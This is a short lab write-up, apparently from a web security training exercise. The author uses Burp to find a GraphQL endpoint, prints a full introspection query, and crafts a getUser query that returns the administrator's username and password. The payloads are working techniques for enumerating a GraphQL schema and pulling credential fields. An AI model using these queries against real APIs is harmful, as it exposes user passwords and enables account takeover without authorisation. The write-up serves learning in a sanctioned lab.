In this lab the user management functions for this lab are powered by a GraphQL endpoint. 
The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username carlos.


For this i used the burp scanner to scan the endpoint of /graphql/v1

which gave the following to retrieve info from the database schema:
"
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } 
types { ...FullType } directives { name description args { ...InputValue } } } } 
fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } 
type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } 
enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } 
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } 
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"}
"

from this i looked through the daat and seen the getUser query in the schema, using this info I crafted the following payload:
"
query query {
    getUser(id:1) {
        id
        username
        password
     }
}
"

this gave me the administrator's username and password as it was the first user id in the database
